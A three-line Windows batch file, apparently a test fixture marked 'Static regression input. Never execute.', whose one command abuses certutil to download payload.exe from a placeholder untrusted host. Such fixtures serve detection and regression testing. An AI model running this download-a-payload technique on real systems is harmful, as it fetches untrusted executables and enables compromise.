@echo off
REM Static regression input. Never execute.
certutil -urlcache -split -f https://untrusted.invalid/payload.exe payload.exe
